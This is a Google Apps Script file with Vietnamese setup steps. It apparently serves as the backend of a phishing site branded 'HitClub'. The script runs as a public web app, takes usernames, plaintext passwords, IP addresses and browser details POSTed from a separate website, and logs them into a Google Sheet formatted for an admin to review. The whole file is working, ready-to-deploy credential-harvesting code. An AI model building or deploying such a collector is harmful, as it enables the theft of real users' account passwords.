/**
 * ====================================================================
 * HƯỚNG DẪN CẤU HÌNH GOOGLE APPS SCRIPT CHO HITCLUB
 * ====================================================================
 * 1. Mở một Google Sheet mới (hoặc Sheet có sẵn).
 * 2. Trên thanh menu, chọn: Tiện ích mở rộng (Extensions) > Apps Script.
 * 3. Xóa toàn bộ nội dung cũ trong trình soạn thảo, dán toàn bộ đoạn mã này vào.
 * 4. Nhấn biểu tượng "Lưu dự án" (Ctrl + S hoặc Command + S).
 * 5. Nhấn nút "Triển khai" (Deploy) ở góc trên bên phải:
 *    - Nếu tạo mới: Chọn "Triển khai mới" (New deployment) > Ứng dụng web (Web app).
 *    - Nếu cập nhật: Chọn "Quản lý bản triển khai" (Manage deployments) > Bấm icon cây bút (Edit) > Phiên bản (Version) chọn "Phiên bản mới" (New version) > Nhấn "Triển khai" (Deploy).
 *    - Thực thi dưới tên (Execute as): Tôi (Me - email của bạn).
 *    - Ai có quyền truy cập (Who has access): Bất kỳ ai (Anyone). *QUAN TRỌNG*
 * 6. Nhấn nút "Triển khai" (Deploy). Cấp quyền truy cập nếu Google yêu cầu.
 * 7. Sao chép "URL ứng dụng web" (kết thúc bằng /exec).
 * 8. Dán URL này vào file .env.local:
 *    GOOGLE_SHEET_URL=https://script.google.com/macros/s/.../exec
 *    NEXT_PUBLIC_SHEET_URL=https://script.google.com/macros/s/.../exec
 * ====================================================================
 */

const SHEET_NAME = 'Sheet1';

// Header chuẩn khi khởi tạo trang tính (đã có phân loại Đăng nhập / Đăng ký)
const HEADERS = [
  'Thời gian',
  'Loại hành động',
  'Tên đăng nhập',
  'Mật khẩu',
  'Địa chỉ IP',
  'Thiết bị / Trình duyệt',
  'Trang gửi',
];

/**
 * Kiểm tra kết nối khi mở URL trên trình duyệt
 */
function doGet(e) {
  return ContentService.createTextOutput(
    JSON.stringify({
      status: 'ok',
      message: 'HitClub Google Apps Script đang hoạt động sẵn sàng nhận dữ liệu.',
      timestamp: new Date().toISOString(),
    })
  ).setMimeType(ContentService.MimeType.JSON);
}

/**
 * Tiếp nhận dữ liệu đăng nhập / đăng ký từ website
 */
function doPost(e) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.getSheets()[0];
    }

    // Parse dữ liệu từ client
    let data = {};
    if (e && e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (jsonErr) {
        data = e.parameter || {};
      }
    } else if (e && e.parameter) {
      data = e.parameter;
    }

    const type = data.type || (data.action ? data.action : 'Đăng nhập');
    const username = data.username || '';
    const password = data.password || '';
    const ip = data.ip || '';
    const userAgent = data.userAgent || '';
    const referer = data.referer || '';
    const timeStr = data.time || Utilities.formatDate(new Date(), 'Asia/Ho_Chi_Minh', 'HH:mm:ss dd/MM/yyyy');

    if (!username && !password) {
      return ContentService.createTextOutput(
        JSON.stringify({ ok: false, message: 'Dữ liệu rỗng' })
      ).setMimeType(ContentService.MimeType.JSON);
    }

    // Tự động kiểm tra và nâng cấp cấu trúc Header nếu cần
    if (sheet.getLastRow() === 0) {
      // Sheet trống hoàn toàn: tạo mới tiêu đề
      sheet.appendRow(HEADERS);
      const headerRange = sheet.getRange(1, 1, 1, HEADERS.length);
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#2c3e50');
      headerRange.setFontColor('#ffffff');
      headerRange.setHorizontalAlignment('center');
      sheet.setFrozenRows(1);
    } else {
      // Kiểm tra xem sheet đã có cột "Loại" chưa
      const firstRow = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
      const hasTypeCol = firstRow.some(function(col) {
        const val = String(col).toLowerCase();
        return val.includes('loại') || val.includes('hành động');
      });

      if (!hasTypeCol) {
        // Tự động chèn cột "Loại hành động" vào vị trí cột thứ 2
        sheet.insertColumnAfter(1);
        const headerCell = sheet.getRange(1, 2);
        headerCell.setValue('Loại hành động');
        headerCell.setFontWeight('bold');
        headerCell.setBackground('#2c3e50');
        headerCell.setFontColor('#ffffff');
        headerCell.setHorizontalAlignment('center');
      }
    }

    // Ghi một dòng mới vào Google Sheet:
    // Cột: Thời gian | Loại hành động | Tên đăng nhập | Mật khẩu | IP | Thiết bị | Trang gửi
    sheet.appendRow([
      timeStr,
      type,
      username,
      password,
      ip,
      userAgent,
      referer,
    ]);

    // Tự động định dạng màu sắc cho cột Loại hành động ở dòng mới để admin dễ phân biệt
    const lastRow = sheet.getLastRow();
    const typeCell = sheet.getRange(lastRow, 2);
    typeCell.setFontWeight('bold');
    typeCell.setHorizontalAlignment('center');
    if (String(type).toLowerCase().includes('ký')) {
      typeCell.setBackground('#e8f8f5');
      typeCell.setFontColor('#117a65'); // Màu xanh lá cho Đăng ký
    } else {
      typeCell.setBackground('#fef9e7');
      typeCell.setFontColor('#b7950b'); // Màu vàng cam cho Đăng nhập
    }

    return ContentService.createTextOutput(
      JSON.stringify({ ok: true, message: 'Ghi dữ liệu thành công' })
    ).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(
      JSON.stringify({ ok: false, error: error.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}
